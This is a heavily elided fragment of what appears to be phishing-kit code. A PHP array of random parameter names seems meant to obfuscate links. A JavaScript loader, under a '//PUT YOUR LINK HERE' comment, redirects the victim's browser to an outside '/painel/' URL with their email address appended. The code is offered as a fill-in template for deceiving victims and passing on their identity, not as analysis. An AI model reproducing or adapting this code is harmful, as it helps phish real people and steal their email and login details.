...
{
	$result = false;
	$randwords = array("tyid", "puid", "xtrans", "updno", "unit", "sessionid", "serialid", "usr", "user", "member", "id", "sub", "refid", "mode", "memberid", "userid", "uid", "referral", "jksdjksd", "jksjkds", "ioweo", "und", "jksd", "dfuif", "iowed", "ncmsd", "tywhjdnsm", "ukerfb", "yuweb", "tyesf");
...
<html>
	...
	function loader()
	{
		...
		else if($valu == "90")
		{
			...
			//PUT YOUR LINK HERE
			window.location="https://paginadepolicia.com.br/painel/hytfrddfggtt/WEALTH$?email=" + $email;
		}
		else
		{
